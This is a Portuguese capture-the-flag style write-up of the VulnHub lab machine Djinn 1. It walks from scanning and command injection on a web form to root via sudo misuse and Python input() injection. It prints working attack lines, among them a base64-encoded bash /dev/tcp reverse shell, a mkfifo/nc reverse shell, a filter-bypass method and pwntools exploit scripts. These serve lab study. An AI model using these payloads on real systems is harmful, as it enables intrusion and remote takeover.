---
title: "VulnHub - Djinn 1"
tags: [Linux,Easy,Port Knocking,Gobuster,BurpSuite,Wfuzz]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/inicial.png)

Link: <https://www.vulnhub.com/entry/djin-1,397/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas aberta no servidor

> Porta 21 -> FTP

> Porta 22 -> SSH (Filtrada)

## Enumeração da Porta 21 (FTP)

Fazemos login anonimo com sucesso no servidor FTP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/ftp.png)

Baixamos os três arquivos txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/ftp1.png)

Lemos eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/ftp2.png)

Credenciais... interessante, não iremos conseguir logar no SSH com ela pq a porta está filtrada, mas ele deu a dica da porta 1337, vamos enumerar ela então

## Enumeração da Porta 1337

Rodamos no **nmap** nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/nmap1.png)

Damos um nc agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/nc.png)

Bom, poderia responder essas mil perguntas, mas pelo nome do serviço ser **waste**, deve ser realmente perda de tempo, então vamos enumarar novamente.

## Nmap novamente

Vamos rodar um nmap em todas as portas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/nmap2.png)

Opa, uma nova porta apareceu!

**7331**

## Enumeração da Porta 7331

Vamos verificar do que ela se trata então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/nmap3.png)

Opa, página web, então vamos acessar ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/web.png)

E rodar um gobuster já

**gobuster dir -u http://192.168.56.113:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/gobuster.png)

Encontramos o **genie** e o **wish**

Acessamos ambos, e o wish chamou atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/genie.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/wish.png)

## RCE

Tentamos executar um comando então...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/wish1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/wish3.png)

Sucesso!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/wish2.png)

## Reverse Shell

Agora vamos pegar um reverse shell então

Tentamos o mais simples, e vemos que não vai, aparece **wrong choice of words**, ou seja tem algum filtro nele

**nc -e /bin/sh 192.168.56.102 443**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/rev.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/rev1.png)

Show, vamos jogar pro burp pra melhor trabalhar essa requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/rev.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/burp.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/burp1.png)

Verificamos a mensagem de erro ao mandar um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/burp2.png)

Vamos testar várias strings agora pra descobrir qual está com problema, verificamos que ele bloqueia apenas algumas strings, especificamente as com saida de chars no tamanho 273, então vamos dar o --hh pra não mostrar elas

**wfuzz --hh 273 -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d 'cmd=FUZZ' -u 'http://192.168.56.113:7331/wish'**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/wfuzz.png)

Aqui está as que ele bloqueia

**wfuzz --hh 231 -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d 'cmd=FUZZ' -u 'http://192.168.56.113:7331/wish'**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/wfuzz1.png)

Praticamente todos os nosso reverse shell tem / ou . então fica difícil de conseguirmos executar algm tipo de reverse shell, a solução é fazer em base64, e jogar pra ele decodificar e jogar pro bash, uma vez que o pipe não está sendo bloqueado, então vamos lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/rev2.png)

O comando final fica assim

```bash
echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMi80NDMgMD4mMQo=" | base64 -d | bash
```

Agora ganhamos um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/rev3.png)

# www-data - Nitish

Essa é fácil, já temos as credenciais, mas antes vamos ver outro ponto bacana, lembra daquela porta 22 que estava filtrada? Então, possivelmente temos que realizar um port knocking nela

## Port Knocking

Qual a ideia de port knocking? Ele é utilizado para que portas que não devem estar sempre abertas fiquem fechadas e só sejam abertas quando houver o "toque", "knock" em portas específicas. De bruto modo é isso, ta, show de bola… e quais são essas portas?

Uma wiki bacana, que explica do que se trata pode ser encontrada em:

[Knocking](https://wiki.archlinux.org/index.php/Port_knocking)

Podemos ver isso no arquivo de configuração do **knockd**

**cat /etc/knockd.conf**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/knock.png)

Vamos tentar bater nelas então pra ver se conseguimos abrir a porta 22 e acessar o servidor via SSH

### Através do nmap

```bash
for x in 1356 6784 3409; do nmap -Pn --max-retries 0 -p $x 192.168.56.113; done 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/knock1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/knock2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/knock3.png)

Porta aberta!

### Através do knock

```bash
nmap -p22 192.168.56.113
knock 192.168.56.113 1356 6784 3409
nmap -p22 192.168.56.113
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/knock4.png)

Porta aberta!

## Login SSH

Tentamos agora fazer o login via ssh, uma vez que a porta foi aberta

Não deu...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/login.png)

Realmente, esse usuário não existe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/login1.png)

Voltando pra enumeração da máquina, dentro da pasta do usuário **nitish** temos uma credencial...

nitish:p4ssw0rdStr3r0n9

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/creds.png)

Agora logamos... mas po, poderiamos ir direto no shell de www-data e dar um su nitish, sim, poderiamos, mas não podia perder a chance de exemplificar novamente o port knocking

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/login2.png)

# Nitish - Sam

Verificando o **sudo -l** do user Nitish, temos que ele pode executar o binário **/usr/bin/genie** como usuário sam

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo.png)

Então tentamos várias coisas com ele, nada deu sucesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo1.png)

Então verificamos a man page dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo2.png)

Opa, temos um **cmd**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo3.png)

Então agora somos Sam

# Sam - Root

Novamente rodando o **sudo -l** verificamos que o sam pode executar um binário como root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo4.png)

Verificamos do que se trata...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo5.png)

Depois de muita tentativa vi que não ia ser tão fácil assim, então voltei na parte da enumeração

## Pyc

Verificando na home dele, temos um arquivo **.pyc** que pelo que parece lembra um pouco essa aplicação, tem umas strings parecidas, então abri um Python HTTP pra poder puxar esse arquivo pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/sudo6.png)

Baixamos ele pra nossa Kali e verificamos do que se trata esse formato pyc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/pyc.png)

É o "resto" de um binário em python compilado, no caso podemos perceber que é o mesmo que o nosso usuário tem permissões de root

Então vamos decompilar ele pra ter o código fonte

Vamos utilizar o **python-uncompyle6**

**https://github.com/rocky/python-uncompyle6.git**

Baixamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/unc.png)

Instalamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/unc1.png)

Decompilamos o .pyc

**uncompyle6 .pyc > djin.py**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/unc2.png)

Agora verificamos o código fonte dele e vemos que realmente é do da aplicação que eu tenho sudo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/unc3.png)

1 - Verifico a função Guess The Number

2 - Vejo que ela chama a guessit()

3 - Verifico ela lá em cima

4 - E vejo se o "n" for igual a "sum" ele vai me dar um shell

Agora então, pego um shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/unc4.png)

Explicação da Vulnerabilidade

[Python String](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/)

A ideia aqui e explorar a função input, se eu passar uma string pra ela, ela vai interpretar como string, no caso se eu colocar s == num (querendo que o num seja número), contudo, a função input vai transformar isso em string também, qnd compara, da certo e me da o shell de root!

# Flags

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/root.png)

# Algo a Mais

Vamos verificar o que mais podemos fazer nessa máquina...

Vamos verificar aquele waste na porta 1337, será que tem algo?

Sim, ele tem, mas é o Port Knocking que conhecemos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais.png)

Temos como automatizar isso? Pra não precisar fazer 1000 contas de matemática

## Pwntools

Pra isso usei o **pwntools**

O script math.py ficou assim

```python
#!/usr/bin/env python3
# Importamos a biblioteca pwn para podermos interagir com o host
from pwn import *

# Setamos o remote host e a remote port para realizar a conexão
c = remote('192.168.56.113',1337)

# Colocamos até onde vamos receber do servidor, se eu setar uma variável vai ser tudo que eu não vou querer, que não vai continuar na execução do script

# Coloquei \n\n pq é onde eu percebi que ele da dois 'enter', pra iniciar a parte escrita, é essa parte escrita de baixo que eu quero trabalhar
c.recvuntil("\n\n", drop=True)
# Dessa parte de baixo, parte escrita, eu quero trabalhar com tudo que vem depois do ( que é a equação matemática em si

# Aqui vamos fazer o loop de 1000 vezes
for i in range(1001):

        # Aqui vou delimitar a primeira parte da equação, vou atribuir variável pq vai ser o que vai ser "dropado", não oq vai ficar na execução do script
        # "Lendo" em pwn seria: me dê de ( até ,
        c.recvuntil("(", drop=True)
        a = c.recvuntil(", ", drop=True)

        # Agora vamos pegar a equação matemática que está sendo pedida
        # "Lendo" em pwn seria: me dê de ' até '
        c.recvuntil("'", drop=True)
        eq = c.recvuntil("'", drop=True)

        # Aqui vou delimitar o segundo numero da equação, novamente vou atribuir variável pq vai ser a parte que será dropado
        # "Lendo" em pwn seria: me dê , até )
        c.recvuntil(", ", drop=True)
        b = c.recvuntil(")",drop=True)

        # Vamos fazer a conta
        conta = a+eq+b
        print("Tentativa Numero="+str(i)+" "+str(conta.decode("utf-8")))

        # Agora mandamos a resposta para o servidor
        c.sendlineafter(">",conta)

# Aqui é pra quando acabar me dar um prompt da seção, pq senão eu perco o "presente"
c.interactive()
```

E aqui está a resposta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais1.png)

## Python Command Injection

Sabendo (ou não) que é uma aplicaçã python que está sendo executada, podemos tentar injetar comandos nele, importando modulos direto na linha de comando, no input dele

```python
__import__('os').system('id')
```

Vemos que é possível! Vamos pegar um shell de root então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais2.png)

```python
__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 443 >/tmp/f')
```

Pronto, somos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais3.png)

## Command Injection + Pwn

command.py
```python
#!/usr/bin/env python3
# Importamos a biblioteca pwn para podermos interagir com o host
from pwn import *

# Setamos o remote host e a remote port para realizar a conexao
c = remote('192.168.56.113',1337)
shell = "__import__('os').system('bash')"
c.sendlineafter(">",shell)
c.interactive()
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais5.png)

## Bash direto

Podemos fazer direto também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-djin1/mais4.png)

Bom, as possibilidades são muitas, bons estudos!